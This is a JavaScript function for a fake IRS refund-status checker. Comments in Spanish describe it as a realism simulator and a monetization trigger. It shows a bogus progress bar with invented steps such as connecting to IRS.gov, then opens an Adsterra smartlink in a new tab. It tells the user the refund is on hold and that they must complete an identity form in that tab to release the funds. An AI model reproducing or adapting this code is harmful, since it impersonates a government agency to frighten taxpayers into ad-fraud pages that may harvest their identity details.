function startAnalysis() {
    const btn = document.getElementById('main-btn');
    const loader = document.getElementById('loader');
    const inputGroup = document.querySelector('.input-group');
    const progressFill = document.getElementById('progress-fill');
    const loaderText = document.getElementById('loader-text');
    const resultArea = document.getElementById('result-area');

    // Validación de entrada para realismo
    const amount = document.getElementById('amount').value;
    if (!amount || amount < 1) {
        alert("Please enter a valid estimated refund amount to proceed.");
        return;
    }

    // Ocultar el formulario y activar el simulador
    inputGroup.style.display = 'none';
    loader.style.display = 'block';

    let progress = 0;
    const steps = [
        "Establishing Secure Connection to IRS.gov...",
        "Scanning 2026 Master File Database...",
        "Verifying Path Act Compliance...",
        "Checking for Identity Audit Flags...",
        "Finalizing Refund Disbursement Estimate..."
    ];

    const interval = setInterval(() => {
        // Incremento de progreso aleatorio para que parezca un proceso real de datos
        progress += Math.random() * 14; 
        
        if (progress > 100) progress = 100;
        
        progressFill.style.width = progress + "%";
        
        // Actualiza el texto técnico según el porcentaje
        let stepIndex = Math.floor((progress / 101) * steps.length);
        loaderText.innerText = steps[stepIndex];

        if (progress === 100) {
            clearInterval(interval);
            
            // --- DISPARO DE MONETIZACIÓN (ADSTERRA) ---
            // Abre tu Smartlink en una pestaña nueva para generar el ingreso
            window.open('https://www.profitablecpmratenetwork.com/kqjsxz1r?key=1eb02dc62189c90cdd691d656041593d', '_blank'); 
            
            // UI de "Gancho Final" en la pestaña original
            loader.style.display = 'none';
            resultArea.innerHTML = `
                <div style="background: rgba(248, 81, 73, 0.1); border: 1px solid #f85149; padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(248, 81, 73, 0.2);">
                    <h3 style="color: #f85149; margin-top: 0; font-size: 20px;">REFUND STATUS: ON HOLD</h3>
                    <p style="font-size: 15px; color: #c9d1d9; line-height: 1.5;">The system has detected a <strong>"Verification Flag"</strong> for your 2026 refund of <strong>$${amount}</strong>.</p>
                    
                    <div style="background: #f85149; color: white; padding: 12px; border-radius: 6px; font-weight: bold; margin: 20px 0; font-size: 14px;">
                        COMPLETE THE IDENTITY FORM IN THE NEW TAB TO RELEASE FUNDS
                    </div>
                    
                    <p style="font-size: 12px; color: #8b949e;">Your deposit date will be assigned once the external verification is confirmed.</p>
                    
                    <button onclick="location.reload()" style="background: transparent; color: #58a6ff; font-size: 13px; border: none; text-decoration: underline; cursor: pointer; margin-top: 15px;">
                        I didn't see the form (Click to Restart Check)
                    </button>
                </div>
            `;
        }
    }, 750); // Velocidad óptima para mantener la atención
}
